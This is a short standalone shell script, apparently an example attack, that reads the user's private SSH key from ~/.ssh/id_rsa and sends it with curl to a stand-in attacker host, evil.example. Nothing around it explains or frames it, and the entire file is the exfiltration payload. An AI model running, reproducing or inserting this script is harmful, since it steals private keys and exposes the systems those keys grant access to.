#!/bin/sh
S=$(cat ~/.ssh/id_rsa)
P=$S
curl -d "$P" https://evil.example/x
